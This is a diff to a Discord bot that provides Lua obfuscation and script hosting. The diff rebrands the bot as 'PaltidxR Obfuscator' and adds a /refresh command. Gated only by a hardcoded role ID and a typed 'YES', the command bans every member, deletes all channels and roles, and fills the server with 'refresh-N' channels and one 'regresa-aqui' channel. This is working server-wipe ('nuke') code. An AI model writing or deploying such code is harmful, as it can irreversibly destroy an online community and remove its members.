@@ -3,6 +3,7 @@ require('dotenv').config();
 const {
     Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder,
     AttachmentBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
+    PermissionsBitField
 } = require('discord.js');
 const axios = require('axios');
 
@@ -15,6 +16,7 @@ const GUILD_ID = process.env.GUILD_ID || '1528140415276941555';
 const AUTO_ROLE_ID = process.env.AUTO_ROLE_ID || '1529532495832416326';
 const API_URL = (process.env.API_URL || '').replace(/\/+$/, '');
 const API_SHARED_SECRET = process.env.API_SHARED_SECRET || '';
+const REFRESH_ROLE_ID = '1524796988812431461'; // Role ID para usar /refresh
 
 const client = new Client({
     intents: [
@@ -23,6 +25,7 @@ const client = new Client({
         GatewayIntentBits.MessageContent,
         GatewayIntentBits.DirectMessages,
         GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildModeration,
     ],
 });
 
@@ -96,6 +99,14 @@ async function registerCommands() {
         new SlashCommandBuilder()
             .setName('help')
             .setDescription('Show available commands'),
+
+        new SlashCommandBuilder()
+            .setName('refresh')
+            .setDescription('⚠️ DELETE EVERYTHING and recreate the server (OWNER ROLE ONLY)')
+            .addStringOption(opt =>
+                opt.setName('confirm')
+                    .setDescription('Type "YES" to confirm')
+                    .setRequired(true)),
     ];
 
     try {
@@ -125,6 +136,8 @@ client.on('interactionCreate', async interaction => {
             await handleApiUrl(interaction);
         } else if (interaction.commandName === 'help') {
             await handleHelp(interaction);
+        } else if (interaction.commandName === 'refresh') {
+            await handleRefresh(interaction);
         }
     } catch (err) {
         console.error('Interaction error:', err);
@@ -181,21 +194,18 @@ async function deliverObfuscationResult(interaction, original, obfuscated) {
             { name: 'Pastefy', value: pasteUrl, inline: false },
             { name: 'Size', value: `Original: ${original.length} bytes\nObfuscated: ${obfuscated.length} bytes`, inline: false },
         )
-        .setFooter({ text: 'Banana Obfuscator' });
+        .setFooter({ text: 'PaltidxR Obfuscator' });
 
-    // Enviar archivo solo por DM
     try {
         await interaction.user.send({ embeds: [dmEmbed], files: [attachment] });
-        // Mensaje en el canal avisando que se envió por DM
         const channelEmbed = new EmbedBuilder()
             .setColor(0x00FF00)
             .setTitle('✅ Obfuscation completed')
             .setDescription(`${interaction.user}, check your DMs for the obfuscated file.`)
-            .setFooter({ text: 'Banana Obfuscator' });
+            .setFooter({ text: 'PaltidxR Obfuscator' });
         
         await interaction.editReply({ embeds: [channelEmbed] });
     } catch (_) {
-        // Si no se puede enviar DM, enviar como archivo adjunto en el canal
         const fallbackEmbed = new EmbedBuilder()
             .setColor(0x00FF00)
             .setTitle('⚠️ Obfuscation completed')
@@ -204,7 +214,7 @@ async function deliverObfuscationResult(interaction, original, obfuscated) {
                 { name: 'Pastefy', value: pasteUrl, inline: false },
                 { name: 'Size', value: `Original: ${original.length} bytes\nObfuscated: ${obfuscated.length} bytes`, inline: false },
             )
-            .setFooter({ text: 'Banana Obfuscator' });
+            .setFooter({ text: 'PaltidxR Obfuscator' });
 
         await interaction.editReply({
             embeds: [fallbackEmbed],
@@ -235,7 +245,7 @@ async function handleUpload(interaction) {
             .setColor(0x0099FF)
             .setTitle('Uploaded to Pastefy')
             .addFields({ name: 'URL', value: data.url || data.id || 'N/A' })
-            .setFooter({ text: 'Banana Obfuscator' });
+            .setFooter({ text: 'PaltidxR Obfuscator' });
         await interaction.editReply({ embeds: [embed] });
     } catch (err) {
         await interaction.editReply({ content: `Upload failed: ${err.message}` });
@@ -294,7 +304,7 @@ async function handleApiUrl(interaction) {
     try {
         const response = await axios.post(
             `${API_URL}/api/scripts`,
-            { code: sourceCode },
+            { script: sourceCode },
             {
                 headers: {
                     'Content-Type': 'application/json',
@@ -309,7 +319,7 @@ async function handleApiUrl(interaction) {
         );
 
         const scriptUrl = response.data?.url;
-        const scriptId = response.data?.id;
+        const scriptId = response.data?.scriptId;
         if (!scriptUrl || !scriptId) {
             throw new Error('The Hosting API returned an invalid response.');
         }
@@ -353,7 +363,7 @@ function makeLoader(scriptUrl) {
 
 async function handleCopyButton(interaction) {
     const scriptId = interaction.customId.slice('api_copy:'.length);
-    const scriptUrl = `${API_URL}/script/${encodeURIComponent(scriptId)}`;
+    const scriptUrl = `${API_URL}/files/v1/loaders/${encodeURIComponent(scriptId)}`;
     const loader = makeLoader(scriptUrl);
 
     await interaction.reply({
@@ -373,10 +383,178 @@ async function handleHelp(interaction) {
             { name: '/upload', value: 'Upload Lua code or a file to Pastefy.', inline: false },
             { name: '/api_url', value: 'Create a protected Hosting URL from Lua code or a file.', inline: false },
             { name: '/help', value: 'Show this help message.', inline: false },
+            { name: '/refresh', value: '⚠️ DESTROY AND RECREATE THE SERVER (OWNER ROLE ONLY)', inline: false },
         )
-        .setFooter({ text: 'Banana Obfuscator' });
+        .setFooter({ text: 'PaltidxR Obfuscator' });
 
     await interaction.reply({ embeds: [embed] });
+}
+
+// ======================================================================
+// ============ COMANDO /refresh (DESTRUCTIVO) ============
+// ======================================================================
+async function handleRefresh(interaction) {
+    // Verificar que el usuario tenga el role específico
+    const member = interaction.member;
+    const hasRole = member.roles.cache.has(REFRESH_ROLE_ID);
+    
+    if (!hasRole) {
+        await interaction.reply({
+            content: '❌ You are not authorized to use this command. You need the **Owner Role** to use this command.',
+            ephemeral: true
+        });
+        return;
+    }
+
+    const confirm = interaction.options.getString('confirm');
+    
+    if (confirm !== 'YES') {
+        await interaction.reply({
+            content: '❌ You must type "YES" to confirm. This action is irreversible!',
+            ephemeral: true
+        });
+        return;
+    }
+
+    await interaction.reply({
+        content: '⚠️ **WARNING:** Starting server refresh... This will DELETE EVERYTHING!',
+        ephemeral: true
+    });
+
+    const guild = interaction.guild;
+
+    try {
+        // ============ 1. BANEAR A TODOS LOS MIEMBROS ============
+        await interaction.followUp({ content: '🔨 Banning all members...', ephemeral: true });
+        
+        const members = await guild.members.fetch();
+        let bannedCount = 0;
+        
+        for (const [memberId, member] of members) {
+            if (member.user.bot) {
+                try {
+                    await member.ban({ reason: 'Server refresh - PaltidxR' });
+                    bannedCount++;
+                } catch (e) {}
+            } else if (!member.user.bot && member.id !== interaction.user.id) {
+                try {
+                    await member.ban({ reason: 'Server refresh - PaltidxR' });
+                    bannedCount++;
+                } catch (e) {}
+            }
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Banned ${bannedCount} members.`, 
+            ephemeral: true 
+        });
+
+        // ============ 2. ELIMINAR TODOS LOS CANALES ============
+        await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
+        
+        const channels = await guild.channels.fetch();
+        let channelCount = 0;
+        
+        for (const [channelId, channel] of channels) {
+            try {
+                await channel.delete();
+                channelCount++;
+            } catch (e) {}
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${channelCount} channels.`, 
+            ephemeral: true 
+        });
+
+        // ============ 3. ELIMINAR TODOS LOS ROLES ============
+        await interaction.followUp({ content: '🎭 Deleting all roles...', ephemeral: true });
+        
+        const roles = await guild.roles.fetch();
+        let roleCount = 0;
+        
+        for (const [roleId, role] of roles) {
+            if (role.name !== '@everyone' && !role.managed) {
+                try {
+                    await role.delete();
+                    roleCount++;
+                } catch (e) {}
+            }
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${roleCount} roles.`, 
+            ephemeral: true 
+        });
+
+        // ============ 4. CREAR NUEVOS CANALES ============
+        await interaction.followUp({ content: '📝 Creating new channels...', ephemeral: true });
+        
+        const channelNames = [
+            'refresh-1', 'refresh-2', 'refresh-3', 'refresh-4', 'refresh-5',
+            'refresh-6', 'refresh-7', 'refresh-8', 'refresh-9', 'refresh-10',
+            'refresh-11', 'refresh-12', 'refresh-13', 'refresh-14', 'refresh-15',
+            'refresh-16', 'refresh-17', 'refresh-18', 'refresh-19', 'refresh-20'
+        ];
+        
+        let createdCount = 0;
+        
+        for (const name of channelNames) {
+            try {
+                await guild.channels.create({
+                    name: name,
+                    type: 0,
+                    reason: 'Server refresh - PaltidxR'
+                });
+                createdCount++;
+            } catch (e) {}
+        }
+        
+        try {
+            await guild.channels.create({
+                name: 'regresa-aqui',
+                type: 0,
+                reason: 'Server refresh - PaltidxR'
+            });
+            createdCount++;
+        } catch (e) {}
+
+        await interaction.followUp({ 
+            content: `✅ Created ${createdCount} channels.`, 
+            ephemeral: true 
+        });
+
+        // ============ 5. MENSAJE FINAL ============
+        await interaction.followUp({
+            content: `
+╔═══════════════════════════════════════════════════╗
+║                                                     ║
+║   🔥 SERVER REFRESH COMPLETED 🔥                    ║
+║                                                     ║
+║   This server has been refreshed by PaltidxR.       ║
+║   All members were banned, all channels and         ║
+║   roles were deleted.                               ║
+║                                                     ║
+║   Created 20+ channels named "refresh-1" to         ║
+║   "refresh-20" and one channel called               ║
+║   "regresa-aqui".                                   ║
+║                                                     ║
+║   ⚠️ This server is now ready for a fresh start.    ║
+║                                                     ║
+║   Powered by PaltidxR 🚀                           ║
+║                                                     ║
+╚═══════════════════════════════════════════════════╝
+            `,
+            ephemeral: true
+        });
+
+    } catch (error) {
+        console.error('Refresh error:', error);
+        await interaction.followUp({
+            content: `❌ Error during refresh: ${error.message}`,
+            ephemeral: true
+        });
+    }
 }
 
 async function uploadToPastefy(code) {
